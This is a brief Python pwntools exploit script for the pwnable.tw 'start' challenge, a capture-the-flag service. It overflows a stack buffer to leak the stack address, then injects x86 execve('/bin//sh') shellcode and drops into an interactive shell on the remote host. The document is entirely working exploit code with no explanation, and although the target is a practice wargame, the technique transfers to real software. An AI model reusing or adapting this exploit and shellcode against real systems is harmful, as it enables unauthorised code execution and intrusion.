from  pwn import *
#context.binary='./start'
shellcode = asm(
    '''
xor ecx,ecx
xor edx,edx
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
mov al,0xb
int 0x80
    '''
)
r = remote('chall.pwnable.tw',10000)
r.recv()
r.send('A'*20+'\x87\x80\x04\x08')
esp_addr = u32(r.recv(4))
print "esp_addr is :",hex(esp_addr)
#r.recv()
r.send('A'*20 + p32(esp_addr+20) + shellcode)#asm(shellcraft.sh())
r.interactive()
